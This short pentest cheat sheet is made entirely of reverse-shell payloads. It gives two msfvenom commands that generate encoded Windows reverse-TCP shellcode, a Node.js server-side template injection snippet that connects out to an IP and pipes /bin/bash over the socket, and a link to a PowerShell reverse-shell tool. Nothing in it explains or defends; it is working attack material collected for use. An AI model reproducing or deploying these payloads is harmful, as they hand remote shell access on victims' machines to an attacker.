
# msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

## JavaScript - Node.JS - SSTI

```
(function(){
 var net = require(“net”),
 cp = require(“child_process”),
 sh = cp.spawn(“/bin/bash”, []);
 var client = new net.Socket();
 client.connect(21, “192.168.49.248”, function(){
 client.pipe(sh.stdin);
 sh.stdout.pipe(client);
 sh.stderr.pipe(client);
 });
 return /a/;
})();
```
# Windows PowerShell
https://github.com/antonioCoco/ConPtyShell
